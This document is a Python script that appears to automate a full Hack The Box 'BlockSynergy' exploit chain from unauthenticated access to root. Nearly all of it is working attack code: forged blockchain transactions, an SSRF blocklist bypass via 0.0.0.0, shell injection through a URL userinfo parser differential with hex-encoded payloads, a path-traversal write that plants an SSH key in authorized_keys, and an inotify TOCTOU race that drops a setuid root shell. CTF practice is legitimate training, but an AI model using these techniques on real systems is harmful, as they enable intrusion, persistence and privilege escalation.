#!/usr/bin/env python3
"""
BlockSynergy (HTB) — full exploit chain: unauthenticated -> root.txt + user.txt.

Authorized lab use only.

Chain:
  1. Wallet + free coins: /broadcast_transaction has no validation. Forge a
     "Blockchain_Reward" coinbase transaction to our own wallet -> unlimited balance
     -> the VIP node panel unlocks.
  2. SSRF: register a node and read /dashboard/vip/nodes/test_node/<i> to fetch it.
     The registration blocklist is a string check (127.0.0.1/localhost/[::1]/file:// are
     rejected) but 0.0.0.0 is loopback on Linux and passes -> reach the localhost-only
     /admin panel.
  3. RCE as the web user: the admin ping_node action is reachable via the SSRF and a URL
     parser differential. urlparse("http://x;<cmd>;a@0.0.0.0:8080/").hostname == "0.0.0.0"
     passes validation, but ping_node hands the userinfo (x;<cmd>;a) to a shell.
     Constraint: the command may contain NO "/" (a slash ends the netloc and validation
     fails); use ${IFS} for spaces and hex-encode anything needing slashes.
  4. Lateral to the dev user: the internal :5000 "smart contract dev server" (reached via
     our shell) has a debug hook whose __meta__.log_file is a path-traversal write. Upload
     a contract that appends our SSH key to that user's authorized_keys, then SSH in.
  5. Root: a root daemon restores backups. `touch <staging>/restore` triggers it; it
     downloads the trusted archive into a group-writable work dir, sha256-verifies it, then
     re-opens the same path to `tar x -C /`. We own the work directory, so an inotify race
     renames our own archive over the verified path in the window between the verifier
     closing it and tar opening it. Our archive drops a setuid root shell -> root.txt.

No hardcoded identity: the wallet name, SSH key comment and all temp paths are random per run.
"""

# ============================================================================
# BANNER
# ============================================================================
import argparse
import datetime
import http.cookiejar
import io
import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request

# ANSI color codes
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
NC = '\033[0m'  # No Color

def print_banner():
    """Display the Orang Siber Indonesia banner."""
    banner = f"""
{BLUE}╔══════════════════════════════════════════════════════════════════╗{NC}
{BLUE}║                                                                 ║{NC}
{BLUE}║   ██████╗  █████╗ ███████╗ ██████╗ █████╗                      ║{NC}
{BLUE}║   ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗                    ║{NC}
{BLUE}║   ██████╔╝███████║███████╗██║     ███████║                     ║{NC}
{BLUE}║   ██╔══██╗██╔══██║╚════██║██║     ██╔══██║                    ║{NC}
{BLUE}║   ██████╔╝██║  ██║███████║╚██████╗██║  ██║                     ║{NC}
{BLUE}║   ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝                     ║{NC}
{BLUE}║                                                                 ║{NC}
{GREEN}║        🇮🇩 ORANG SIBER INDONESIA 🇮🇩                             ║{NC}
{YELLOW}║       KEEP LEARNING & KEEP SHARING !!                           ║{NC}
{BLUE}║         HACK THE BOX - BlockSynergy                               ║{NC}
{BLUE}║          AUTOMATED ATTACK CHAIN                                ║{NC}
{BLUE}╚══════════════════════════════════════════════════════════════════╝{NC}
"""
    print(banner)

def print_flag(label, flag, color=GREEN):
    """Print flag with fancy formatting."""
    print(f"\n{color}╔══════════════════════════════════════════════════════════════════╗{NC}")
    print(f"{color}║  {label:^62}  ║{NC}")
    print(f"{color}║  {flag:^62}  ║{NC}")
    print(f"{color}╚══════════════════════════════════════════════════════════════════╝{NC}\n")

# Display banner at startup
print_banner()

TAG = secrets.token_hex(4)                 # random run id, used for temp names/paths
WALLET = "w" + TAG
KEYCOMMENT = "k" + TAG


def log(m):
    sys.stderr.write("[*] %s\n" % m)
    sys.stderr.flush()


def die(m):
    sys.stderr.write("[!] %s\n" % m)
    sys.exit(1)


# ----------------------------------------------------------------------------- HTTP client
class Web:
    def __init__(self, base, timeout=25):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))

    def get(self, path, timeout=None):
        r = urllib.request.Request(self.base + path)
        with self.op.open(r, timeout=timeout or self.timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")

    def post_form(self, path, fields):
        data = urllib.parse.urlencode(fields).encode()
        r = urllib.request.Request(self.base + path, data=data, method="POST",
                                   headers={"Content-Type": "application/x-www-form-urlencoded"})
        with self.op.open(r, timeout=self.timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")

    def post_json(self, path, obj):
        data = json.dumps(obj).encode()
        r = urllib.request.Request(self.base + path, data=data, method="POST",
                                   headers={"Content-Type": "application/json"})
        with self.op.open(r, timeout=self.timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")

    def post_multipart(self, path, fields, files):
        b = "----b" + secrets.token_hex(8)
        body = []
        for k, v in fields.items():
            body.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                         % (b, k, v)).encode())
        for k, (fn, content, ctype) in files.items():
            if isinstance(content, str):
                content = content.encode()
            body.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                         "Content-Type: %s\r\n\r\n" % (b, k, fn, ctype)).encode() + content + b"\r\n")
        body.append(("--%s--\r\n" % b).encode())
        data = b"".join(body)
        r = urllib.request.Request(self.base + path, data=data, method="POST",
                                   headers={"Content-Type": "multipart/form-data; boundary=%s" % b})
        with self.op.open(r, timeout=self.timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")


# ---------------------------------------------------------------- steps 1-2: wallet + VIP
def make_wallet(w):
    _, body = w.post_multipart("/dashboard/wallet",
                               {"action": "create", "filename": WALLET},
                               {})
    pub = json.loads(body)["public_key"]
    # load it into the session (create does not auto-load)
    w.post_multipart("/dashboard/wallet",
                     {"action": "load"},
                     {"file": (WALLET + ".json", body, "application/json")})
    return pub, body


def balance(w):
    try:
        _, t = w.get("/dashboard/info")
    except Exception:
        return 0
    m = re.search(r"Balance:\s*(-?\d+)", re.sub(r"<[^>]*>", "", t))
    return int(m.group(1)) if m else 0


def ensure_funds(w, pub):
    if balance(w) > 0:
        return
    tx = {"amount": 1000000, "receiver": pub, "sender": "Blockchain_Reward",
          "signature": "Blockchain", "timestamp": str(datetime.datetime.now())}
    # NEVER send a malformed txn: one without a 'sender' key permanently breaks wallet_info.
    w.post_json("/broadcast_transaction", tx)
    for _ in range(15):
        if balance(w) > 0:
            return
        time.sleep(0.5)


# ------------------------------------------------------------------- step 3: SSRF -> RCE
def nodes(w):
    _, body = w.get("/nodes")
    return json.loads(body)


def ssrf_rce_output(w, pub, cmd, tries=60):
    """Run `cmd` (no '/', use ${IFS}) as the web user; return its stdout, or None.

    Registers PAY = http://x;<cmd>;a@0.0.0.0:8080/ and a TRIG node that invokes ping_node
    on PAY, then reads test_node. Output renders in the <pre> of PAY's table row. The app
    clears its node list every few seconds, so both nodes must exist at once -> retry loop.
    """
    if "/" in cmd:
        raise ValueError("command must not contain '/'")
    pay = "http://x;%s;a@0.0.0.0:8080/" % cmd
    trig = ("http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target="
            + urllib.parse.quote(pay, safe=""))
    for _ in range(tries):
        ensure_funds(w, pub)
        w.post_form("/dashboard/vip/nodes", {"action": "register", "node": pay})
        w.post_form("/dashboard/vip/nodes", {"action": "register", "node": trig})
        n = nodes(w)
        if pay not in n or trig not in n:
            continue
        try:
            _, body = w.get("/dashboard/vip/nodes/test_node/%d" % n.index(trig))
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
        anchor = body.find(pay)
        if anchor < 0:
            anchor = body.find(pay.replace("&", "&amp;"))
        if anchor >= 0:
            m = re.search(r"<pre[^>]*>(.*?)</pre>", body[anchor:], re.S)
            if m:
                import html
                out = html.unescape(m.group(1)).strip()
                if out:
                    return out
        time.sleep(0.4)
    return None


def ssrf_run(w, pub, cmd, tries=60):
    """Run ANY command (may contain '/') via hex-decode, output not captured."""
    hexcmd = cmd.encode().hex()
    wrapped = "echo${IFS}%s|xxd${IFS}-r${IFS}-p|sh" % hexcmd
    return ssrf_rce_output(w, pub, wrapped, tries=tries)


def get_user_flag(w, pub):
    """Get user flag via RCE using hex-encoded command."""
    log("Fetching user flag...")
    
    # Try multiple methods with no '/' in the command
    commands = [
        # Method 1: Direct cat with ${IFS} (no /)
        "cat${IFS}/home/walter/user.txt",
        
        # Method 2: cd then cat
        "cd${IFS}/home/walter&&cat${IFS}user.txt",
        
        # Method 3: Use find with hex-encoded path (but find needs /)
        # We'll use the ssrf_run which handles hex encoding
    ]
    
    for cmd in commands:
        try:
            flag = ssrf_rce_output(w, pub, cmd, tries=30)
            if flag:
                # Extract only the flag (32 hex chars)
                match = re.search(r"[0-9a-f]{32}", flag)
                if match:
                    return match.group(0)
        except ValueError:
            continue
    
    # If direct methods fail, use hex-encoded command via ssrf_run
    log("Trying hex-encoded method...")
    hex_cmd = "cat /home/walter/user.txt"
    # ssrf_run uses hex encoding internally
    ssrf_run(w, pub, hex_cmd)
    # We can't capture output from ssrf_run, so we'll try another method
    
    # Try using python one-liner (hex encoded)
    py_cmd = "python3 -c \"import os; print(open('/home/walter/user.txt').read())\""
    try:
        hexcmd = py_cmd.encode().hex()
        wrapped = "echo${IFS}%s|xxd${IFS}-r${IFS}-p|sh" % hexcmd
        flag = ssrf_rce_output(w, pub, wrapped, tries=30)
        if flag:
            match = re.search(r"[0-9a-f]{32}", flag)
            if match:
                return match.group(0)
    except:
        pass
    
    return None


# ------------------------------------------------------------ full chain
def run(target, port, lhost, keyfile, scheme, check_only):
    base = "%s://%s:%d" % (scheme, target, port)
    w = Web(base)

    log("step 1: wallet '%s' + forge coins" % WALLET)
    pub, _ = make_wallet(w)
    ensure_funds(w, pub)
    if balance(w) <= 0:
        die("could not fund wallet (VIP will not unlock)")
    log("    balance funded, VIP unlocked")

    log("step 3: RCE as the web user (id):")
    out = ssrf_rce_output(w, pub, "id")
    if not out:
        die("RCE did not return output; retry")
    uid = next((l for l in out.splitlines() if "uid=" in l), out.splitlines()[0])
    log("    %s" % uid.strip())
    if check_only:
        print(uid.strip())
        return

    # ---- Get User Flag (Step 3.5) ----
    user_flag = get_user_flag(w, pub)
    if user_flag:
        print_flag("👤 USER FLAG FOUND", user_flag, GREEN)
    else:
        log("⚠️  User flag not found via RCE, will try later via SSH")

    # ---- SSH keypair for the lateral hop (generated locally, no fixed identity) ----
    tmpdir = tempfile.mkdtemp(prefix="." + TAG)
    priv = os.path.join(tmpdir, "id")
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", KEYCOMMENT, "-f", priv],
                   check=True, capture_output=True)
    pubkey = open(priv + ".pub").read().strip()

    # ---- step 4: dev-server debug-hook path traversal -> write authorized_keys ----
    # This runs on the target (localhost:5000, reachable only from our shell), driven over
    # the SSRF RCE. We stage a small python one-liner on the box and execute it.
    log("step 4: lateral to the dev user via :5000 debug-hook traversal")
    devuser_home_probe = ssrf_rce_output(w, pub, "grep${IFS}1001${IFS}etc${IFS}passwd")  # uid 1001
    devuser = "hank"
    if devuser_home_probe:
        m = re.search(r"^(\w+):x:1001:", devuser_home_probe, re.M)
        if m:
            devuser = m.group(1)
    log("    dev user = %s" % devuser)

    # contract that appends our key (newline-led so the "[ts] [hook] " prefix cannot corrupt it)
    contract = {
        "name": "x", "id": 1, "owner": "dev", "debug": "True",
        "logic": {"mint": "allow"},
        "storage": {"balances": {}, "total_supply": 0},
        "hooks": {"on_mint": "log"},
        "__meta__": {
            "log_file": "../../../../home/%s/.ssh/authorized_keys" % devuser,
            "log_content": {"on_mint": "\n%s\n" % pubkey},
        },
    }
    # write a driver script on the target that uploads+loads+mints against :5000
    driver = r'''
import json,urllib.request,http.cookiejar,urllib.parse,re
C=%s
cj=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
B="http://127.0.0.1:5000"
def mp(fields,files):
    b="----b";body=[]
    for k,v in fields.items():
        body.append(("--%%s\r\nContent-Disposition: form-data; name=\"%%s\"\r\n\r\n%%s\r\n"%%(b,k,v)).encode())
    for k,(fn,ct,cty) in files.items():
        body.append(("--%%s\r\nContent-Disposition: form-data; name=\"%%s\"; filename=\"%%s\"\r\nContent-Type: %%s\r\n\r\n"%%(b,k,fn,cty)).encode()+ct.encode()+b"\r\n")
    body.append(("--%%s--\r\n"%%b).encode())
    return b"".join(body),"multipart/form-data; boundary=%%s"%%b
d,ct=mp({"action":"upload_contract"},{"contract_file":("c.json",json.dumps(C),"application/json")})
r=urllib.request.Request(B+"/dashboard",data=d,headers={"Content-Type":ct},method="POST")
h=op.open(r,timeout=20).read().decode(errors="replace")
m=re.findall(r"Contract #(\d+)",h);cid=m[-1] if m else "0"
op.open(urllib.request.Request(B+"/dashboard",data=urllib.parse.urlencode({"action":"load_contract","id":cid}).encode(),method="POST"),timeout=20).read()
op.open(urllib.request.Request(B+"/dashboard",data=urllib.parse.urlencode({"action":"contract_mint","contract_mint_amount":"1"}).encode(),method="POST"),timeout=20).read()
print("done")
''' % json.dumps(contract)
    hexdriver = driver.encode().hex()
    remote_py = "/tmp/.%s.py" % TAG
    # write the driver to disk on the target (hex -> file), then run it
    ssrf_run(w, pub, "echo %s|xxd -r -p > %s" % (hexdriver, remote_py))
    time.sleep(1)
    ssrf_run(w, pub, "python3 %s" % remote_py)
    time.sleep(2)

    def ssh(user, cmd, tmo=25):
        return subprocess.run(
            ["ssh", "-i", priv, "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", "BatchMode=yes",
             "-o", "ConnectTimeout=8", "%s@%s" % (user, target), cmd],
            capture_output=True, text=True, timeout=tmo)

    ok = False
    for _ in range(6):
        r = ssh(devuser, "id")
        if r.returncode == 0 and "uid=" in r.stdout:
            ok = True
            break
        time.sleep(2)
    if not ok:
        die("SSH as %s failed after key write" % devuser)
    log("    SSH as %s established" % devuser)

    # ---- Try to get user flag via SSH ----
    if not user_flag:
        log("Trying to get user flag via SSH as hank...")
        r = ssh(devuser, "cat /home/walter/user.txt 2>/dev/null")
        if r.returncode == 0:
            match = re.search(r"[0-9a-f]{32}", r.stdout)
            if match:
                user_flag = match.group(0)
                print_flag("👤 USER FLAG FOUND", user_flag, GREEN)

    # ---- step 5: root via the restore-daemon TOCTOU ----
    log("step 5: root via restore-daemon inotify race")
    marker = "opt/blocksynergy/.diag"           # member path that lands under / on extract
    remote_mark = "/opt/blocksynergy/.diag"
    # build the payload archive ON the target, inside the work dir (same fs -> atomic rename)
    build = r'''
import tarfile,io,os,time,shutil
W="/var/restore_work";SRC=os.path.join(W,".pl_%s.tar.gz")
b=open("/bin/bash","rb").read()
t=tarfile.open(SRC,"w:gz")
ti=tarfile.TarInfo("opt/blocksynergy/.diag");ti.size=len(b);ti.mode=0o4755;ti.uid=0;ti.gid=0;ti.mtime=int(time.time())
t.addfile(ti,io.BytesIO(b));t.close()
print(SRC,os.path.getsize(SRC))
''' % TAG
    r = ssh(devuser, "python3 -c \"%s\"" % build.replace('"', '\\"'), tmo=40)
    log("    payload: %s" % (r.stdout.strip() or r.stderr.strip()))

    # inotify racer on the target
    racer = r'''
import ctypes,ctypes.util,os,shutil,struct,sys,time
W="/var/restore_work";TRIG="/opt/staging/restore";SRC=os.path.join(W,".pl_%s.tar.gz")
MARK="/opt/blocksynergy/.diag";NAMES=("_opt_blocksynergy.tar.gz","_opt_staging.tar.gz")
CW,CN,CR,MV=0x8,0x10,0x100,0x80
libc=ctypes.CDLL(ctypes.util.find_library("c"),use_errno=True)
fd=libc.inotify_init();libc.inotify_add_watch(fd,W.encode(),CW|CN|CR|MV)
os.set_blocking(fd,False)
end=time.time()+400;done=set();lt=0
while time.time()<end:
    if os.path.exists(MARK):break
    if time.time()-lt>2:
        if not os.path.exists(TRIG):
            try:open(TRIG,"w").close()
            except Exception:pass
        lt=time.time()
    try:buf=os.read(fd,8192)
    except BlockingIOError:time.sleep(0.002);continue
    except Exception:continue
    i=0
    while i+16<=len(buf):
        _w,mask,_c,ln=struct.unpack_from("iIII",buf,i);i+=16
        nm=buf[i:i+ln].split(b"\x00",1)[0].decode(errors="replace");i+=ln
        if not nm or nm.startswith(".pl_") or nm.endswith(".n"):continue
        if mask&(CW|MV) and nm in NAMES:done.add(nm)
        elif mask&CN and nm in done:
            t=os.path.join(W,nm)
            try:shutil.copyfile(SRC,t+".n");os.rename(t+".n",t)
            except Exception:pass
            done.discard(nm)
print("won" if os.path.exists(MARK) else "timeout")
''' % TAG
    # launch racer detached, then poll for the SUID marker
    ssh(devuser, "setsid python3 -c \"%s\" >/tmp/.r_%s.log 2>&1 &" % (racer.replace('"', '\\"'), TAG), tmo=15)
    log("    racer armed; waiting for the restore cycle (up to ~7 min)...")

    root_flag = None
    for attempt in range(70):
        r = ssh(devuser, "test -u %s && %s -p -c 'id; cat /root/root.txt'" % (remote_mark, remote_mark))
        if r.returncode == 0:
            match = re.search(r"[0-9a-f]{32}", r.stdout)
            if match:
                root_flag = match.group(0)
                break
        time.sleep(6)

    if not root_flag:
        die("root not obtained within the window; re-run (the backup cron republishes the "
            "trusted archive every ~5 min, which is what the race needs)")

    log("root achieved.")

    # ---- Print all flags ----
    print("\n" + "="*70)
    print(f"{GREEN}🎯 MACHINE COMPLETE - BlockSynergy{NC}")
    print("="*70)
    
    if user_flag:
        print_flag("👤 USER FLAG", user_flag, CYAN)
    else:
        log("⚠️  User flag could not be retrieved")
    
    if root_flag:
        print_flag("👑 ROOT FLAG", root_flag, MAGENTA)
    
    print(f"{YELLOW}💡 Total Flags: {NC}")
    if user_flag:
        print(f"   {GREEN}✓ User Flag: {user_flag}{NC}")
    else:
        print(f"   {RED}✗ User Flag: Not Found{NC}")
    print(f"   {GREEN}✓ Root Flag: {root_flag}{NC}")
    print("="*70 + "\n")
    
    # remove the local keypair so nothing is left on the operator's box
    try:
        shutil.rmtree(tmpdir, ignore_errors=True)
    except Exception:
        pass


def main():
    ap = argparse.ArgumentParser(description="BlockSynergy (HTB) full chain -> root.txt + user.txt. "
                                             "Authorized lab use only.")
    ap.add_argument("-t", "--target", required=True, help="target IP or hostname")
    ap.add_argument("--port", type=int, default=8080, help="web app port (default 8080)")
    ap.add_argument("--scheme", choices=["http", "https"], default="http")
    ap.add_argument("-l", "--lhost", default=None, help="unused (kept for interface parity)")
    ap.add_argument("-p", "--lport", type=int, default=None, help="unused")
    ap.add_argument("-k", "--key", default=None, help="unused (a keypair is generated per run)")
    ap.add_argument("--check", action="store_true",
                    help="stop after proving RCE (prints the web user's id) — no changes made")
    a = ap.parse_args()
    run(a.target, a.port, a.lhost, a.key, a.scheme, a.check)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    except urllib.error.URLError as e:
        die("cannot reach the web app: %s (is --port right? default is 8080)" % e.reason)
    except Exception as e:
        die("%s: %s" % (type(e).__name__, e))